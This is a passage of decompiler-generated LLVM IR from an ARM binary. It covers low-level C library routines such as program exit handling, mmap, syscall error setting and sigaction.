  %v2_143f4 = add i32 %v2_143ec, 96
  %v3_143f4 = inttoptr i32 %v2_143f4 to i32*
  %v4_143f4 = load i32, i32* %v3_143f4, align 4
  store i32 %v4_143f4, i32* %r2.global-to-local, align 4
  br i1 %v2_143f0, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_143d0
  %v2_143fc58 = inttoptr i32 %v4_143f4 to i32*
  store i32 0, i32* %v2_143fc58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_143d0
  %v2_143f8 = add i32 %v4_143e4, 1
  store i32 %v2_143f8, i32* %r3.global-to-local, align 4
  %v2_143fc = inttoptr i32 %v4_143f4 to i32*
  store i32 %v4_143e4, i32* %v2_143fc, align 4
  %v1_14400 = load i32, i32* %r3.global-to-local, align 4
  %v2_14400 = load i32, i32* %r2.global-to-local, align 4
  %v3_14400 = inttoptr i32 %v2_14400 to i32*
  store i32 %v1_14400, i32* %v3_14400, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_143b0
  %v2_14410 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14410, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1441c = add i32 %v2_14410, -12
  store i32 %v2_1441c, i32* %r5.global-to-local, align 4
  store i32 2000, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1442c = add i32 %v2_14410, 2000
  %v4_1442c = inttoptr i32 %v3_1442c to i32*
  store i32 %arg5, i32* %v4_1442c, align 4
  %v0_1444418 = load i32, i32* %r4.global-to-local, align 4
  %v1_1444419 = load i32, i32* %r7.global-to-local, align 4
  %v3_1444421 = icmp uge i32 %v0_1444418, %v1_1444419
  store i1 %v3_1444421, i1* %cpsr_c.global-to-local, align 1
  %v9_1444427 = icmp eq i32 %v0_1444418, %v1_1444419
  store i1 %v9_1444427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1444421, label %dec_label_pc_14478.lr.ph, label %dec_label_pc_14434

dec_label_pc_14434:                               ; preds = %bb84, %dec_label_pc_14434
  %v1_14434 = phi i32 [ %v1_14440, %dec_label_pc_14434 ], [ %v0_1444418, %bb84 ]
  %v0_14434 = load i32, i32* %r5.global-to-local, align 4
  %v2_14434 = and i32 %v1_14434, 1073741824
  %v3_14434 = icmp ne i32 %v2_14434, 0
  store i1 %v3_14434, i1* %cpsr_c.global-to-local, align 1
  %v4_14434 = mul i32 %v1_14434, 4
  %v5_14434 = add i32 %v4_14434, %v0_14434
  %v6_14434 = inttoptr i32 %v5_14434 to i32*
  %v7_14434 = load i32, i32* %v6_14434, align 4
  store i32 %v7_14434, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14434)
  %v0_14440 = load i32, i32* %r4.global-to-local, align 4
  %v1_14440 = add i32 %v0_14440, 1
  store i32 %v1_14440, i32* %r4.global-to-local, align 4
  %v1_14444 = load i32, i32* %r7.global-to-local, align 4
  %v3_14444 = icmp uge i32 %v1_14440, %v1_14444
  store i1 %v3_14444, i1* %cpsr_c.global-to-local, align 1
  %v9_14444 = icmp eq i32 %v1_14440, %v1_14444
  store i1 %v9_14444, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14444, label %dec_label_pc_14478.lr.ph, label %dec_label_pc_14434

dec_label_pc_14478.lr.ph:                         ; preds = %dec_label_pc_14434, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1444c = icmp eq i32 %v0_14298, 0
  store i1 %v2_1444c, i1* %cpsr_z.global-to-local, align 1
  %v2_14454 = xor i1 %v2_1444c, true
  call void @__pseudo_cond_branch(i1 %v2_14454, i32 %v0_14298)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_14460 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_1446c = add i32 %v2_14460, -12
  store i32 %v2_1446c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14478

dec_label_pc_14478:                               ; preds = %dec_label_pc_14478.dec_label_pc_14478_crit_edge, %dec_label_pc_14478.lr.ph
  %v1_14478 = phi i32 [ %v1_14484, %dec_label_pc_14478.dec_label_pc_14478_crit_edge ], [ 0, %dec_label_pc_14478.lr.ph ]
  %v0_14478 = phi i32 [ %v0_14478.pre, %dec_label_pc_14478.dec_label_pc_14478_crit_edge ], [ %v2_1446c, %dec_label_pc_14478.lr.ph ]
  %v2_14478 = and i32 %v1_14478, 1073741824
  %v3_14478 = icmp ne i32 %v2_14478, 0
  store i1 %v3_14478, i1* %cpsr_c.global-to-local, align 1
  %v4_14478 = mul i32 %v1_14478, 4
  %v5_14478 = add i32 %v4_14478, %v0_14478
  %v6_14478 = inttoptr i32 %v5_14478 to i32*
  %v7_14478 = load i32, i32* %v6_14478, align 4
  store i32 %v7_14478, i32* %ip.global-to-local, align 4
  store i32 83076, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_14478)
  %v0_14484 = load i32, i32* @r4, align 4
  %v1_14484 = add i32 %v0_14484, 1
  store i32 %v1_14484, i32* @r4, align 4
  %v1_14488 = load i32, i32* @r7, align 4
  %v3_14488 = icmp uge i32 %v1_14484, %v1_14488
  store i1 %v3_14488, i1* %cpsr_c.global-to-local, align 1
  %v9_14488 = icmp eq i32 %v1_14484, %v1_14488
  store i1 %v9_14488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14488, label %dec_label_pc_14490, label %dec_label_pc_14478.dec_label_pc_14478_crit_edge

dec_label_pc_14478.dec_label_pc_14478_crit_edge:  ; preds = %dec_label_pc_14478
  %v0_14478.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14478

dec_label_pc_14490:                               ; preds = %dec_label_pc_14478
  %v2_14494.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14494.pre, i32* %r0.global-to-local, align 4
  %v2_14498 = add i32 %v2_14494.pre, -66936
  store i32 %v2_14498, i32* %r2.global-to-local, align 4
  store i32 %v2_14498, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144a0 = icmp eq i32 %v2_14498, 0
  store i1 %v2_144a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_144a0, label %dec_label_pc_144b8, label %dec_label_pc_144a8

dec_label_pc_144a8:                               ; preds = %dec_label_pc_14490
  store i32 83120, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_14498)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_144b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_144b4 = inttoptr i32 %v1_144b4 to i32*
  store i32 0, i32* %v2_144b4, align 4
  %v2_144bc.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_144b8

dec_label_pc_144b8:                               ; preds = %dec_label_pc_14490, %dec_label_pc_144a8
  %v2_144bc = phi i32 [ %v2_14494.pre, %dec_label_pc_14490 ], [ %v2_144bc.pre, %dec_label_pc_144a8 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_144bc, i32* %r1.global-to-local, align 4
  %v2_144c0 = add i32 %v2_144bc, 128
  %v3_144c0 = inttoptr i32 %v2_144c0 to i32*
  %v4_144c0 = load i32, i32* %v3_144c0, align 4
  store i32 %v4_144c0, i32* %r2.global-to-local, align 4
  store i32 %v4_144c0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144c8 = icmp eq i32 %v4_144c0, 0
  store i1 %v2_144c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_144c8, label %dec_label_pc_144e0, label %dec_label_pc_144d0

dec_label_pc_144d0:                               ; preds = %dec_label_pc_144b8
  store i32 83160, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_144c0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_144dc = load i32, i32* %r0.global-to-local, align 4
  %v2_144dc = inttoptr i32 %v1_144dc to i32*
  store i32 0, i32* %v2_144dc, align 4
  br label %dec_label_pc_144e0

dec_label_pc_144e0:                               ; preds = %dec_label_pc_144b8, %dec_label_pc_144d0
  %v2_144e0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_144e0, i32* @r0, align 4
  %v1_144e4 = call i32 @_setjmp(i32 %v2_144e0)
  store i32 %v1_144e4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144e8 = icmp eq i32 %v1_144e4, 0
  store i1 %v2_144e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_144e8, label %dec_label_pc_144f0, label %dec_label_pc_1453c

dec_label_pc_144f0:                               ; preds = %dec_label_pc_144e0
  %v0_144f0 = call i32 @__aeabi_read_tp()
  store i32 %v0_144f0, i32* %r0.global-to-local, align 4
  %v1_144f4 = add i32 %v0_144f0, -1168
  store i32 %v1_144f4, i32* %r2.global-to-local, align 4
  %v2_144fc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_144fc, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_14508 = add i32 %v2_144fc, 56
  %v3_14508 = inttoptr i32 %v2_14508 to i32*
  %v4_14508 = load i32, i32* %v3_14508, align 4
  store i32 %v4_14508, i32* %ip.global-to-local, align 4
  store i32 %v2_144e0, i32* %r3.global-to-local, align 4
  %v2_14518 = add i32 %v0_144f0, -1040
  %v3_14518 = inttoptr i32 %v2_14518 to i32*
  store i32 %v2_144e0, i32* %v3_14518, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_14524 = load i32, i32* %ip.global-to-local, align 4
  %v1_14524 = inttoptr i32 %v0_14524 to i32*
  %v2_14524 = load i32, i32* %v1_14524, align 4
  store i32 %v2_14524, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_14534 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_145d8

dec_label_pc_1453c:                               ; preds = %dec_label_pc_144e0
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_14540 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14540, i32* %ip.global-to-local, align 4
  %v2_14544 = add i32 %v2_14540, 40
  %v3_14544 = inttoptr i32 %v2_14544 to i32*
  %v4_14544 = load i32, i32* %v3_14544, align 4
  store i32 %v4_14544, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14544)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_14554 = load i32, i32* %stack_var_-416, align 4
  %v2_14558 = add i32 %v2_14554, 120
  %v3_14558 = inttoptr i32 %v2_14558 to i32*
  %v4_14558 = load i32, i32* %v3_14558, align 4
  store i32 %v4_14558, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1455c

dec_label_pc_1455c:                               ; preds = %dec_label_pc_14590.dec_label_pc_1455c_crit_edge, %dec_label_pc_1453c
  %v0_1455c = phi i32 [ %v0_1455c.pre, %dec_label_pc_14590.dec_label_pc_1455c_crit_edge ], [ %v4_14558, %dec_label_pc_1453c ]
  %v1_1455c = inttoptr i32 %v0_1455c to i32*
  %v2_1455c = load i32, i32* %v1_1455c, align 4
  store i32 %v0_1455c, i32* %r2.global-to-local, align 4
  store i32 %v2_1455c, i32* %r4.global-to-local, align 4
  %v1_14568 = add i32 %v2_1455c, -1
  store i32 %v1_14568, i32* %r1.global-to-local, align 4
  %v2_1456c89 = load i32, i32* %v1_1455c, align 4
  store i32 %v2_1456c89, i32* %r3.global-to-local, align 4
  %v3_1457091 = icmp uge i32 %v2_1456c89, %v2_1455c
  store i1 %v3_1457091, i1* %cpsr_c.global-to-local, align 1
  %v9_1457097 = icmp eq i32 %v2_1456c89, %v2_1455c
  store i1 %v9_1457097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1457097, label %dec_label_pc_14578, label %dec_label_pc_14590

dec_label_pc_14578:                               ; preds = %dec_label_pc_1455c, %dec_label_pc_14578.dec_label_pc_1456c_crit_edge
  %v0_1457898 = phi i32 [ %v1_14570.pre, %dec_label_pc_14578.dec_label_pc_1456c_crit_edge ], [ %v2_1455c, %dec_label_pc_1455c ]
  store i32 %v0_1457898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14588 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14588, label %dec_label_pc_1458c, label %dec_label_pc_14578.dec_label_pc_1456c_crit_edge

dec_label_pc_14578.dec_label_pc_1456c_crit_edge:  ; preds = %dec_label_pc_14578
  %v0_1456c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14570.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1456c = inttoptr i32 %v0_1456c.pre to i32*
  %v2_1456c = load i32, i32* %v1_1456c, align 4
  store i32 %v2_1456c, i32* %r3.global-to-local, align 4
  %v3_14570 = icmp uge i32 %v2_1456c, %v1_14570.pre
  store i1 %v3_14570, i1* %cpsr_c.global-to-local, align 1
  %v9_14570 = icmp eq i32 %v2_1456c, %v1_14570.pre
  store i1 %v9_14570, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14570, label %dec_label_pc_14578, label %dec_label_pc_14590

dec_label_pc_1458c:                               ; preds = %dec_label_pc_14578
  %v0_1458c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1458c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14590

dec_label_pc_14590:                               ; preds = %dec_label_pc_1455c, %dec_label_pc_14578.dec_label_pc_1456c_crit_edge, %dec_label_pc_1458c
  %v0_14598 = phi i32 [ %v0_1458c, %dec_label_pc_1458c ], [ %v2_1456c89, %dec_label_pc_1455c ], [ %v2_1456c, %dec_label_pc_14578.dec_label_pc_1456c_crit_edge ]
  %v1_14590 = phi i32 [ %v0_1458c, %dec_label_pc_1458c ], [ %v2_1455c, %dec_label_pc_1455c ], [ %v1_14570.pre, %dec_label_pc_14578.dec_label_pc_1456c_crit_edge ]
  %v3_14590 = icmp uge i32 %v0_14598, %v1_14590
  store i1 %v3_14590, i1* %cpsr_c.global-to-local, align 1
  %v9_14590 = icmp eq i32 %v0_14598, %v1_14590
  store i1 %v9_14590, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14590, label %dec_label_pc_14598, label %dec_label_pc_14590.dec_label_pc_1455c_crit_edge

dec_label_pc_14590.dec_label_pc_1455c_crit_edge:  ; preds = %dec_label_pc_14590
  %v0_1455c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1455c

dec_label_pc_14598:                               ; preds = %dec_label_pc_14590
  %v2_14598 = icmp ne i32 %v1_14590, 0
  store i1 %v2_14598, i1* %cpsr_c.global-to-local, align 1
  %v7_14598 = icmp eq i32 %v1_14590, 1
  store i1 %v7_14598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14598, label %dec_label_pc_145d8, label %dec_label_pc_145a0

dec_label_pc_145a0:                               ; preds = %dec_label_pc_14598
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_145d8

dec_label_pc_145d8:                               ; preds = %dec_label_pc_14598, %dec_label_pc_145a0, %dec_label_pc_144f0
  %storemerge2 = phi i32 [ %v0_14534, %dec_label_pc_144f0 ], [ 0, %dec_label_pc_145a0 ], [ 0, %dec_label_pc_14598 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_145dc = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_145dc, i32* %r0.global-to-local, align 4
  %v0_145e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_145e0, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_145d8
  %v2_145e0 = load i32, i32* @r8, align 4
  %v8_145e4 = shl i32 %v2_145e0, %v1_145dc
  %v9_145e4 = and i32 %v8_145e4, %v1_145dc
  %v8_145e8 = lshr i32 %v2_145e0, %v9_145e4
  %v9_145e8 = and i32 %v8_145e8, %v9_145e4
  %v2_145ec = inttoptr i32 %v9_145e8 to i64*
  %v3_145ec = load i64, i64* %v2_145ec, align 4
  %v4_145ec = load i32, i32* %r4.global-to-local, align 4
  %v5_145ec = trunc i64 %v3_145ec to i32
  %v6_145ec = udiv i64 %v3_145ec, 4294967296
  %v7_145ec = trunc i64 %v6_145ec to i32
  store i32 %v5_145ec, i32* %r1.global-to-local, align 4
  %v9_145ec = sub i32 %v7_145ec, %v4_145ec
  %v3_145f0 = mul i32 %v9_145ec, %v4_145ec
  %v5_145f8 = mul i32 %v3_145f0, 4
  %v5_145fc = udiv i32 %v4_145ec, 2
  %v6_145f8 = and i32 %v3_145f0, %v5_145fc
  %v6_145fc = and i32 %v6_145f8, %v5_145f8
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_145fc, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_145d8, %bb85
  %v5_14600 = phi i32 [ %v1_145dc, %dec_label_pc_145d8 ], [ %v6_145fc, %bb85 ]
  ret i32 %v5_14600

; uselistorder directives
  uselistorder i32 %v3_145f0, { 1, 0 }
  uselistorder i32 %v1_145dc, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_14590, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1458c, { 1, 0, 2 }
  uselistorder i32 %v1_14570.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1455c, { 1, 0 }
  uselistorder i32 %v2_144bc, { 1, 0 }
  uselistorder i32 %v2_14494.pre, { 2, 0, 1 }
  uselistorder i32 %v1_14488, { 1, 0 }
  uselistorder i32 %v1_14484, { 3, 2, 1, 0 }
  uselistorder i32 %v1_14478, { 1, 0 }
  uselistorder i32 %v1_14444, { 1, 0 }
  uselistorder i32 %v1_14440, { 1, 2, 3, 0 }
  uselistorder i32 %v1_14434, { 1, 0 }
  uselistorder i32 %v2_14410, { 1, 0, 2 }
  uselistorder i32 %v4_143f4, { 1, 0, 2 }
  uselistorder i32 %v4_143e4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1432c, { 1, 2, 0 }
  uselistorder i32 %v2_142f8, { 1, 2, 0 }
  uselistorder i32 %v1_142f4, { 1, 2, 0 }
  uselistorder i1 %v2_142e0, { 1, 0, 2 }
  uselistorder i32 %v5_142e4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_142b0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14298, { 1, 0, 2 }
  uselistorder i32 %v2_1428c, { 1, 0, 2 }
  uselistorder i32 %v3_1425c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 1, 2, 3, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 0, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 2, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 0, 10, 11, 12, 14, 13, 1, 15, 17, 16, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 3, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 4, 6, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 2004, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_145d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14590, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14578, { 1, 0 }
  uselistorder label %dec_label_pc_144e0, { 1, 0 }
  uselistorder label %dec_label_pc_144b8, { 1, 0 }
  uselistorder label %dec_label_pc_14434, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_143b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14388, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_142f8, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_142e0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1462c = load i32, i32* @r4, align 4
  store i32 %v3_1462c, i32* %stack_var_-16, align 4
  %v3_14638 = urem i32 %arg3, 4096
  %v2_1463c = icmp eq i32 %v3_14638, 0
  br i1 %v2_1463c, label %dec_label_pc_14660, label %dec_label_pc_14644

dec_label_pc_14644:                               ; preds = %entry
  %v0_14648 = call i32 @__aeabi_read_tp()
  store i32 %v0_14648, i32* %r0.global-to-local, align 4
  %v3_1464c = load i16, i16* @global_var_21510.336, align 2
  %v4_1464c = sext i16 %v3_1464c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14658 = add i32 %v4_1464c, %v0_14648
  %v4_14658 = inttoptr i32 %v3_14658 to i32*
  store i32 22, i32* %v4_14658, align 4
  %v0_14694.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14694

dec_label_pc_14660:                               ; preds = %entry
  %v0_14670 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14670, -4095
  br i1 %tmp, label %dec_label_pc_14690, label %dec_label_pc_14678

dec_label_pc_14678:                               ; preds = %dec_label_pc_14660
  %v1_1467c = sub i32 0, %v0_14670
  %v3_14680 = load i16, i16* @global_var_21510.336, align 2
  %v4_14680 = sext i16 %v3_14680 to i32
  %v0_14684 = call i32 @__aeabi_read_tp()
  %v3_14688 = add i32 %v4_14680, %v0_14684
  %v4_14688 = inttoptr i32 %v3_14688 to i32*
  store i32 %v1_1467c, i32* %v4_14688, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14690

dec_label_pc_14690:                               ; preds = %dec_label_pc_14660, %dec_label_pc_14678
  %v0_14690 = phi i32 [ %v0_14670, %dec_label_pc_14660 ], [ -1, %dec_label_pc_14678 ]
  store i32 %v0_14690, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14694

dec_label_pc_14694:                               ; preds = %dec_label_pc_14644, %dec_label_pc_14690
  %v0_14694 = phi i32 [ %v0_14694.pre, %dec_label_pc_14644 ], [ %v0_14690, %dec_label_pc_14690 ]
  store i32 %v0_14694, i32* %r0.global-to-local, align 4
  %v2_14698 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14698, i32* @r4, align 4
  ret i32 %v0_14694

; uselistorder directives
  uselistorder i32 %v0_14694, { 1, 0 }
  uselistorder i32 %v0_14670, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_14694, { 1, 0 }
  uselistorder label %dec_label_pc_14690, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_146a8 = load i32, i32* @lr, align 4
  store i32 %v0_146a8, i32* %stack_var_-4, align 4
  %v0_146b0 = load i32, i32* @r0, align 4
  %v3_146b4 = load i16, i16* @global_var_21510.336, align 2
  %v4_146b4 = sext i16 %v3_146b4 to i32
  store i32 %v4_146b4, i32* @r2, align 4
  %v0_146b8 = call i32 @__aeabi_read_tp()
  %v1_146bc = sub i32 0, %v0_146b0
  store i32 %v1_146bc, i32* @r3, align 4
  %v2_146c0 = load i32, i32* @r2, align 4
  %v3_146c0 = add i32 %v2_146c0, %v0_146b8
  %v4_146c0 = inttoptr i32 %v3_146c0 to i32*
  store i32 %v1_146bc, i32* %v4_146c0, align 4
  %v2_146c8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_146c8, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_146d4 = load i32, i32* @r4, align 4
  %v6_146d4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_146dc = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_146dc, label %dec_label_pc_14730, label %dec_label_pc_146f4

dec_label_pc_146f4:                               ; preds = %entry
  %v1_146f4 = add i32 %arg2, 4
  %v2_146f4 = inttoptr i32 %v1_146f4 to i32*
  %v3_146f4 = load i32, i32* %v2_146f4, align 4
  store i32 %v3_146f4, i32* @r3, align 4
  %v1_146f8 = and i32 %v3_146f4, 67108864
  %v2_146f8 = icmp eq i32 %v1_146f8, 0
  br i1 %v2_146f8, label %dec_label_pc_14700, label %dec_label_pc_14730

dec_label_pc_14700:                               ; preds = %dec_label_pc_146f4
  store i32 20, i32* @r2, align 4
  %v2_14704 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14704, i32* @r0, align 4
  %v0_14708 = call i32 @memcpy()
  store i32 %v2_14704, i32* @ip, align 4
  %v0_14730.pre = load i32, i32* @r5, align 4
  %v0_14738.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14730

dec_label_pc_14730:                               ; preds = %dec_label_pc_146f4, %entry, %dec_label_pc_14700
  %v0_14738 = phi i32 [ %arg3, %dec_label_pc_146f4 ], [ %arg3, %entry ], [ %v0_14738.pre, %dec_label_pc_14700 ]
  %v0_14734 = phi i32 [ %arg2, %dec_label_pc_146f4 ], [ 0, %entry ], [ %v2_14704, %dec_label_pc_14700 ]
  %v0_14730 = phi i32 [ %arg1, %dec_label_pc_146f4 ], [ %arg1, %entry ], [ %v0_14730.pre, %dec_label_pc_14700 ]
  %v4_14740 = call i32 @__syscall_rt_sigaction(i32 %v0_14730, i32 %v0_14734, i32 %v0_14738, i32 8)
  store i32 %v3_146d4, i32* @r4, align 4
  store i32 %v6_146d4, i32* @r5, align 4
  ret i32 %v4_14740

; uselistorder directives
  uselistorder label %dec_label_pc_14730, { 2, 0, 1 }
}

define i32 @function_14754(i32 %arg1) local_unnamed_addr {
dec_label_pc_14754:
  %v0_14754 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14754, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14754
  %v2_14754 = load i32, i32* @r8, align 4
  %v4_14754 = mul i32 %v2_14754, 2
  %v5_14754 = and i32 %v4_14754, %arg1
  %v2_14758 = load i32, i32* @ip, align 4
  %v4_14758 = lshr i32 %v2_14758, %v5_14754
  %v5_14758 = sub i32 32, %v5_14754
  %v6_14758 = shl i32 %v2_14758, %v5_14758
  %v7_14758 = or i32 %v6_14758, %v4_14758
  %v9_14758 = and i32 %v7_14758, %v5_14754
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14754, %bb
  %v10_14758 = phi i32 [ %arg1, %dec_label_pc_14754 ], [ %v9_14758, %bb ]
  ret i32 %v10_14758

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
